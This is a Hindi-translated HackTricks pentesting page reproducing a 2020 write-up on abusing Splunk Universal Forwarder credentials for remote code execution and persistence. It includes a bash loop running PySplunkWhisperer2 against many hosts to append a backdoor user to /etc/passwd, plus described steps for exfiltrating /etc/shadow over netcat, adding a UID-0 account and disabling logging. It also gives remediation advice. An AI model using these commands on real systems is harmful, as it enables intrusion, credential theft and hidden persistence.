<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


यदि आप किसी मशीन को **आंतरिक** या **बाहरी रूप से जाँचते** हुए **Splunk चल रहा** पाते हैं (पोर्ट 8090), यदि आपके पास भाग्य से कोई **वैध क्रेडेंशियल** हैं, तो आप **Splunk सेवा का दुरुपयोग** करके Splunk चलाने वाले उपयोगकर्ता के रूप में एक शैल निष्पादित कर सकते हैं। यदि रूट इसे चला रहा है, तो आप विशेषाधिकार को रूट तक बढ़ा सकते हैं।

इसके अलावा, यदि आप पहले से ही रूट हैं और Splunk सेवा केवल localhost पर सुन रही नहीं है, तो आप Splunk सेवा से **पासवर्ड** फ़ाइल चुरा सकते हैं और पासवर्ड को **क्रैक** कर सकते हैं, या उसमें **नए** क्रेडेंशियल जोड़ सकते हैं। और होस्ट पर स्थिरता बनाए रखें।

पहली छवि में आप देख सकते हैं कि Splunkd वेब पेज कैसा दिखता है।

**निम्नलिखित जानकारी** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) **से कॉपी की गई है**

# शैल और स्थिरता के लिए Splunk फ़ॉरवर्डर का दुरुपयोग

14 अगस्त 2020

## विवरण: <a href="#description" id="description"></a>

Splunk Universal Forwarder एजेंट (UF) अधिकृत दूरस्थ उपयोगकर्ताओं को Splunk API के माध्यम से एकल आदेश या स्क्रिप्ट भेजने की अनुमति देता है। UF एजेंट आने वाली कनेक्शनों की पुष्टि नहीं करता है कि वे एक वैध Splunk Enterprise सर्वर से आ रही हैं, और न ही UF एजेंट सत्यापित करता है कि कोड साइन किया गया है या अन्यथा Splunk Enterprise सर्वर से होने की प्रमाणित किया गया है। इससे एक हमलावर, जो UF एजेंट पासवर्ड तक पहुंच प्राप्त करता है, सिस्टम पर अनियमित कोड चला सकता है, जो ऑपरेटिंग सिस्टम पर निर्भर करता है, या रूट के रूप में।

यह हमला पेनेट्रेशन टेस्टर्स द्वारा उपयोग किया जा रहा है और संभावित रूप से दुष्ट हमलावरों द्वारा जंगली में उपयोग किया जा रहा है। पासवर्ड प्राप्ति सैकड़ों सिस्टमों के कंप्रमाइज़ कर सकती है।

Splunk UF पासवर्ड अप्राय तरीके से प्राप्त किए जा सकते हैं, विवरण के लिए सेक्शन Common Password Locations देखें।

## संदर्भ: <a href="#context" id="context"></a>

Splunk एक डेटा संचयन और खोज उपकरण है जिसे अक्सर एक सुरक्षा सूचना और घटना मॉनिटरिंग (SIEM) सिस्टम के रूप में उपयोग किय
## प्रभाव: <a href="#impact" id="impact"></a>

एक Splunk Universal Forward Agent पासवर्ड के साथ एक हमलावर नेटवर्क में सभी Splunk होस्ट को पूरी तरह से कंप्रोमाइज कर सकता है और प्रत्येक होस्ट पर सिस्टम या रूट स्तर की अनुमति प्राप्त कर सकता है। मैंने सफलतापूर्वक Splunk एजेंट का उपयोग Windows, Linux और Solaris Unix होस्ट पर किया है। यह सुरक्षा दुरुपयोग करने की क्षमता को डंप करने, संवेदनशील डेटा को निकालने या रैंसमवेयर स्थापित करने की अनुमति दे सकती है। यह सुरक्षा दुरुपयोग तेज, उपयोग में आसान और विश्वसनीय है।

Splunk लॉग को हैंडल करता है, इसलिए एक हमलावर को पहले कमांड रन करने पर Universal Forwarder स्थान को बदलने, Splunk SIEM में लॉगिंग अक्षम करने की अनुमति हो सकती है। इससे क्लाइंट ब्लू टीम द्वारा पकड़े जाने के अवसर को बहुत कम कर दिया जाएगा।

Splunk Universal Forwarder को अक्सर लॉग संग्रह के लिए डोमेन कंट्रोलर पर स्थापित देखा जाता है, जो एक हमलावर को आसानी से NTDS फ़ाइल निकालने, एंटीवायरस को अक्षम करने के लिए और/या डोमेन में संशोधन करने की अनुमति दे सकता है।

अंत में, Universal Forwarding एजेंट को लाइसेंस की आवश्यकता नहीं होती है, और इसे पासवर्ड स्टैंड अलोन के साथ कॉन्फ़िगर किया जा सकता है। इस प्रकार एक हमलावर उपयोगकर्ता Universal Forwarder को होस्ट पर बैकडोर स्थायित्व तंत्र के रूप में स्थापित कर सकता है, क्योंकि यह एक वैध एप्लिकेशन है जिसे ग्राहक, विशेष रूप से वे जो Splunk का उपयोग नहीं करते हैं, निकालने की संभावना नहीं है।

## सबूत: <a href="#evidence" id="evidence"></a>

एक शोध पर्यावरण सेटअप करने के लिए मैंने नवीनतम Splunk संस्करण का उपयोग करके उदाहरण एक्सप्लोइटेशन दिखाने के लिए किया है। इस रिपोर्ट के लिए कुल 10 छवियां अटैच की गई हैं, जो निम्नलिखित को दिखाती हैं:

1- PySplunkWhisper2 के माध्यम से /etc/passwd फ़ाइल का अनुरोध करना

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Netcat के माध्यम से हमलावर सिस्टम पर /etc/passwd फ़ाइल प्राप्त करना

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- PySplunkWhisper2 के माध्यम से /etc/shadow फ़ाइल का अनुरोध करना

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Netcat के माध्यम से हमलावर सिस्टम पर /etc/shadow फ़ाइल प्राप्त करना

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- /etc/passwd फ़ाइल में उपयोगकर्ता attacker007 को जोड़ना

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- /etc/shadow फ़ाइल में उपयोगकर्ता attacker007 को जोड़ना

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- नई /etc/shadow फ़ाइल प्राप्त करना जिसमें attacker007 सफलतापूर्वक जोड़ा गया है

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- attacker007 खाता का उपयोग करके पीडीएसएस एक्सेस की पुष्टि करना

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- उपयोगकर्ता root007 के साथ बैकडोर रूट खाता जोड़ना, जिसका उपयोगकर्ता नाम और यूआईडी/जीआईडी 0 पर सेट किया गया है

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- attacker007 का उपयोग करके पीडीएसएस एक्सेस की पुष्टि करना, और फिर root007 का उपयोग करके रूट की ओर उन्नयन करना

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

इस समय मेरे पास Splunk और दो उपयोगकर्ता खातों के माध्यम से होस्ट के प्रतिष्ठानिक एक्सेस है, जिनमें से एक रूट प्रदान करता है। मैं अपने ट्रैक को कवर करने के लिए दूरस्थ लॉगिंग को अक्षम कर सकता हूँ और इस होस्ट का उपयोग करके सिस्टम और नेटवर्क पर हमला जारी रख सकता हूँ।

PySplunkWhisperer2 को स्क्रिप्ट करना बहुत आसान और प्रभावी है।

1. उन होस्टों के आईपी के साथ एक फ़ाइल बनाएं जिन्हें आप दुरुपयोग करना चाहते हैं, उदाहरण नाम ip.txt
2. निम्नलिखित को चलाएँ:
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
## अभिनिवेशन सूचना के लिए सुझाव: Splunk, Inc के लिए <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

मैं सुरक्षा के लिए निम्नलिखित समाधानों को लागू करने की सलाह देता हूँ:

1. आदर्श रूप से, यूनिवर्सल फ़ॉरवर्डर एजेंट के पास कोई खुला पोर्ट नहीं होना चाहिए, बल्कि यह नियमित अंतराल पर स्प्लंक सर्वर से निर्देशों के लिए पोल करेगा।
2. ग्राहकों और सर्वर के बीच टीएलएस सह-प्रमाणीकरण को सक्षम करें, प्रत्येक ग्राहक के लिए व्यक्तिगत कुंजियों का उपयोग करें। यह स्प्लंक सेवाओं के बीच बहुत उच्च द्विदिशीय सुरक्षा प्रदान करेगा। टीएलएस सह-प्रमाणीकरण एजेंटों और आईओटी उपकरणों में गहनतापूर्वक लागू हो रहा है, यह विश्वास प्राप्त उपकरण ग्राहक सर्वर संचार का भविष्य है।
3. सभी कोड, एकल पंक्ति या स्क्रिप्ट फ़ाइलें, एक संपीड़ित फ़ाइल में भेजें जिसे स्प्लंक सर्वर द्वारा एन्क्रिप्टेड और साइन किया जाता है। यह एजेंट डेटा को एपीआई के माध्यम से भेजने से बचाएगा, लेकिन तीसरे पक्ष से दुर्भाग्यपूर्ण दूरस्थ कोड निष्पादन के खिलाफ सुरक्षा प्रदान करेगा।

## ग्राहकों के लिए अभिनिवेशन सूचना: Splunk के लिए <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. सुनिश्चित करें कि Splunk एजेंट के लिए एक बहुत मजबूत पासवर्ड सेट किया गया है। मैं कम से कम 15 वर्णों का एक यादृच्छिक पासवर्ड सिफारिश करता हूँ, लेकिन क्योंकि ये पासवर्ड कभी टाइप नहीं किए जाते हैं, इसे 50 वर्णों जैसा बड़ा पासवर्ड भी सेट किया जा सकता है।
2. होस्ट आधारित फ़ायरवॉल को कॉन्फ़िगर करें ताकि केवल स्प्लंक सर्वर से पोर्ट 8089/TCP (यूनिवर्सल फ़ॉरवर्डर एजेंट का पोर्ट) के लिए कनेक्शन स्वीकार किए जाएं।

## रेड टीम के लिए सुझाव: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. प्रत्येक ऑपरेटिंग सिस्टम के लिए Splunk यूनिवर्सल फ़ॉरवर्डर की एक प्रतिलिपि डाउनलोड करें, क्योंकि यह एक बढ़िया हल्का साइन किया गया इम्प्लांट है। इसे वास्तव में ठीक करने के लिए एक प्रतिलिपि रखना अच्छा होगा।

## अन्य शोधकर्ताओं द्वारा उपयोगी खोज / ब्लॉग <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

उपयोगी सार्वजनिक खोज:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

संबंधित ब्लॉग पोस्ट:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_** नोट: **_ यह समस्या स्प्लंक सिस्टम के साथ एक गंभीर समस्या है और इसे अन्य परीक्षकों द्वारा वर्षों से उपयोग किया गया है। यद्यपि रिमोट कोड निष्पादन स्प्लंक यूनिवर्सल फ़ॉरवर्डर का एक इच्छित सुविधा है, लेकिन इसका अंमलण खतरनाक है। मैंने इस बग को स्प्लंक के बग बाउंटी प्रोग्राम के माध्यम से सबमिट करने का प्रयास किया, बहुत ही कम संभावना है कि उन्हें इस डिज़ाइन के प्रभावों की जानकारी न हो, लेकिन मुझे सूचित किया गया कि किसी भी बग सबमिशन को बग क्राउड / स्प्लंक डिस्क्लोजर पॉलिसी को लागू करना चाहिए, जिसमें विवरणों का कोई भी विवरण स्प्लंक की अनुमति के बिना कभी भी सार्वजनिक रूप से चर्चा नहीं की जा सकती है। मैंने 90 दिन की डिस्क्लोजर टाइमलाइन का अनुरोध किया और इसे इनकार कर दिया गया। इसलिए, मैंने इसे जिम्मेदारीपूर्वक खुलासा नहीं किया क्यो
